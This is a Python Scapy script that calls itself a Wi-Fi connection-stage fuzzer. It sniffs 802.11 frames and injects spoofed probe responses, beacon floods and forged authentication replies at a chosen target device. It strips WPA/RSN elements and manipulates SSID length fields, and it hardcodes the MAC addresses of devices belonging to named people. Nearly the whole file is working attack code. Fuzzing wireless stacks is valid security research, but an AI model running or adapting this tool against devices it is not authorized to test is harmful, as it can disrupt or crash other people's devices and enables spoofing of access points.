from datetime import datetime
from scapy.all import *
import random
import multiprocessing
import time
import sys
import argparse

# (wlan.bssid == 00:0c:29:52:66:4e) && !(wlan.fc.type_subtype == 0x0008)

monitor = "wlan0"
injector = "wlan0"
targetDict = {'shakedPhone' : '6C:C7:EC:BA:E9:22', 'shakedTablet' : '8C:83:E1:F4:16:EC', 'shakedLaptop' : '00:F4:8D:B7:7C:F9', 'shakedKindle' : '4C:17:44:EC:32:ED',
'ellaPhone' : 'DC:0C:5C:B0:D7:36', 'ellaLaptop' : '44:85:00:1C:3A:0E', 'nexus5' : '2C:59:8A:52:04:4C'}
target = targetDict['shakedPhone']
source = "00:0c:29:52:66:4e"

isVerbose = False
		
def removeEltLayer(pkt, ID):
	layer = pkt.getlayer(Dot11Elt)
	while layer:
		if(layer.ID == ID):
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
			break
		layer = layer.payload.getlayer(Dot11Elt)
	return pkt

# *******************
# Probe Attack Begin
# *******************
class ProbeAttack:
	def __init__(self, name, length, isProtected):
		self.name = name
		self.length = length
		self.isProtected = isProtected
		self.probeResp = None

	def __makeNetworkUnprotected(self, pkt): # remove all the tags of protected in the packet
		pkt.getlayer(Dot11ProbeResp).cap = 0x0100
		try:
			layer = pkt.getlayer(Dot11EltMicrosoftWPA)
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			x = 0
		
		try:
			layer = pkt.getlayer(Dot11EltRSN)
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			return pkt		
		return pkt
		
	def __fuzzProbeResponse(self, pkt, name, length):
		pkt = removeEltLayer(pkt, 0)
		pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
		return pkt
			
	def __craftProbeResponse(self, pkt):
		afterRequestLayer = pkt.getlayer(Dot11ProbeReq).payload
		pkt.getlayer(Dot11ProbeReq).underlayer.remove_payload()
		pkt = pkt / Dot11ProbeResp(cap = 0x1100) / afterRequestLayer
		pkt.getlayer(Dot11).subtype = 5 # change subtype to 5 means the packet is of type probe response
		
		clientAddress = pkt.getlayer(Dot11).addr2
		apAddress = pkt.getlayer(Dot11).addr1
		pkt.getlayer(Dot11).addr1, pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = clientAddress, source, source
		return pkt
		
	def __handleProbeResponse(self, pkt):
		global isVerbose
		if pkt.haslayer(Dot11ProbeReq):
			if(pkt.getlayer(Dot11).addr2.lower() != target.lower()):
				return
			print('got probe request from the target, crafting a probe response.')
			resp = self.__craftProbeResponse(pkt) 
			for i in range(10):
				resp = self.__fuzzProbeResponse(resp, self.name, self.length)
				sendp(resp, iface = injector, verbose = isVerbose)
				
	def probeAttackUsingRequest(self):
		sniff(iface = monitor, prn = self.__handleProbeResponse)
		while 1:
			time.sleep(1)

	def probeAttackUsingSniffedResponse(self):
		global isVerbose
		def stopFilter(pkt):
			if(pkt.haslayer(Dot11ProbeResp) and pkt.getlayer(Dot11).addr1.lower() == target.lower()): 
				print("Sniffed a probe response frame")
				self.probeResp = pkt
				return True
			return False

		sniff(iface = monitor, stop_filter = stopFilter)
		while(self.probeResp == None):
			time.sleep(0.1)
		
		self.probeResp.getlayer(Dot11).addr1, self.probeResp.getlayer(Dot11).addr2, self.probeResp.getlayer(Dot11).addr3 = target, source, source
		probeResp = None
		if(self.isProtected == False):
			probeResp = self.__makeNetworkUnprotected(self.probeResp)
		probeResp = self.__fuzzProbeResponse(self.probeResp, self.name, self.length)
		while 1:
			sendp(probeResp, iface = injector, verbose = isVerbose)

# *****************
# Probe Attack End
# *****************

# ********************
# Beacon Attack Begin
# ********************
"""
The argument isProtected:
	The privacy flag in capabilities is always false, no matter the value of the argument isProtected.
		True = "protected" network (by a password) - Beacon packet include protected flags
		False = open network - Beacon packet not include protected flags
"""
class BeaconAttack:
	def __init__(self, name, length, isProtected):
		self.name = name
		self.length = length
		self.isProtected = isProtected
		self.beacon = None
		
	def __makeNetworkUnprotected(self, pkt): # remove all the tags of protected in the packet
		try:
			layer = pkt.getlayer(Dot11EltMicrosoftWPA)
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			x = 0
		
		try:
			layer = pkt.getlayer(Dot11EltRSN)
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			return pkt		
		return pkt

	def __fuzzBeacon(self, pkt, name, length):
		pkt = removeEltLayer(pkt, 0)		
		if(not self.isProtected):
			pkt = self.__makeNetworkUnprotected(pkt)
		pkt.getlayer(Dot11Beacon).cap = 0x0100
		#pkt = pkt / fuzz(Dot11Elt(ID = 0)) # fuzz SSIDs
		pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
		pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = source, source # destination is already broadcast, no need to change
		pkt.getlayer(Dot11).fcs = 1094795585 # AAAA in decimal
		return pkt

	def beaconAttack(self):
		global isVerbose
		def stopFilter(pkt):
			if(pkt.haslayer(Dot11Beacon)): 
				print("Sniffed a beacon frame")
				self.beacon = pkt
				return True
			return False
			
		sniff(iface = monitor, stop_filter = stopFilter)
		while(self.beacon == None):
			time.sleep(0.1)
		beacon = self.__fuzzBeacon(self.beacon, self.name, self.length) 
		while 1:
			sendp(beacon, iface = injector, verbose = isVerbose)
# ******************
# Beacon Attack End
# ******************

# *************************
# Association Attack Begin
# *************************
class AssociationAttack:
	def __init__(self, name, length, isProtected):
		self.name = name
		self.length = length
		self.isProtected = isProtected
		self.beaconThread = None

	def __authentication(self):
		isFirstAuth = True
		def sniffAuthPkts(pkt):
			global isVerbose
			nonlocal isFirstAuth
			if(pkt.haslayer(Dot11Auth) and pkt.getlayer(Dot11).addr1 == source):
				if(isFirstAuth):
					print("received authentication request")
					self.beaconThread.terminate()
					isFirstAuth = False

				pkt.addr1, pkt.addr2, pkt.addr3 = target, source, source
				pkt.seqnum = 2
				sendp(pkt, iface = injector, verbose = isVerbose)

		sniff(iface = monitor, prn = sniffAuthPkts)

	def associationAttack(self):
		beaconClass = BeaconAttack(self.name, self.length, self.isProtected)
		self.beaconThread = multiprocessing.Process(target = beaconClass.beaconAttack)
		self.beaconThread.start()
		self.__authentication()
		while(1):
			time.sleep(1)

# ***********************
# Association Attack End
# ***********************
		
def main():
	global isVerbose
	global target
	global source
	global monitor
	global injector

	name = 'TEST AP'
	length = len(name)
	secured = False

	parser = argparse.ArgumentParser(description='A fuzzer designed to fuzz different stages of the wifi connection process.')
	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
	parser.add_argument("-t", "--target", help="choose a target to fuzz", default=target)
	parser.add_argument("-s", "--source", help="choose what the source address of the packets will be", default=source)
	parser.add_argument("-i", "--interface", help="choose which interface to use", default="wlan0")
	parser.add_argument("--secured", help="make the wifi network created secured by a password", default=secured, action="store_true")
	parser.add_argument("-preq", "--probe-using-request", help="try fuzzing probe responses using a sniffed request from the target", action="store_true")
	parser.add_argument("-pres", "--probe-using-response", help="try fuzzing probe responses using a sniffed response to the target", action="store_true")
	parser.add_argument("--beacon", help="try fuzzing beacon frames", action="store_true")
	parser.add_argument("--assoc", help="try fuzzing the association stage", action="store_true")
	args = parser.parse_args()
	isVerbose = args.verbose
	target = args.target
	source = args.source
	monitor, injector = args.interface, args.interface

	print('\n' + 'Attacker Initialized')
	print('Attacking the target: ' + target + '\n')
	#name = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
	if(args.probe_using_request):
		ProbeAttack(name, length, args.secured).probeAttackUsingRequest()
	elif(args.probe_using_response):
		ProbeAttack(name, length, args.secured).probeAttackUsingSniffedResponse()
	elif(args.beacon):
		BeaconAttack(name, length, args.secured).beaconAttack()
	elif(args.assoc):
		AssociationAttack(name, length, args.secured).associationAttack()
	else:
		parser.error("you must choose an attack")
	
if __name__ == '__main__':
	main()